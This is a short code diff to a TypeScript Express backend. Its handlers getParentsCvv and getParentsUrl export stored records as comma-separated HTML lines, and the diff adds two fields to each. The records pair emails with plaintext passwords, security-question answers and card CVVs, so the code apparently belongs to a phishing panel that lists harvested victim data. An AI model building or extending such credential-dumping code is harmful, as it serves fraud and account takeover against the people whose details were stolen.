@@ -199,10 +199,12 @@ export const getParentsCvv = async (req: Request, res: Response) => {
           second_q,
           third_q,
           cvv,
+          no2,
+          url2,
           stop_sharing,
           no_of_family,
         }) =>
-          `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
+          `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${no2},${url2},${stop_sharing},${no_of_family}`
       )
       .join("<br />");
 
@@ -228,10 +230,12 @@ export const getParentsUrl = async (req: Request, res: Response) => {
           third_q,
           no,
           url,
+          no2,
+          url2,
           stop_sharing,
           no_of_family,
         }) =>
-          `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`
+          `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${no2},${url2},${stop_sharing},${no_of_family}`
       )
       .join("<br />");
 
